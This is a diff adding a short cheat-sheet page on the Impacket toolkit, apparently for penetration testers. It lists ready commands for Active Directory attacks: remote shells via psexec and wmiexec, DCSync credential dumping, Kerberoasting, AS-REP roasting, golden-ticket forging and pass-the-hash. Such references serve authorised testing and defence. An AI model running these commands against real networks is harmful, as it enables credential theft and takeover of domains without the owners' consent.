@@ -1,0 +1,25 @@
+---
+title: "Impacket"
+---
+
+The Python toolkit behind most AD attacks. Common scripts:
+
+```bash
+# remote execution (need admin creds or hash)
+psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
+wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
+smbexec.py / atexec.py / dcomexec.py        # alternatives
+# credentials
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
+GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
+# tickets
+getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
+ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
+# shares / lookups
+smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
+```
+
+<Tip>
+Every script takes `-hashes LM:NT` for pass-the-hash and `-k` for Kerberos (with `KRB5CCNAME`). Use FQDN + `-dc-ip` when Kerberos is finicky.
+</Tip>
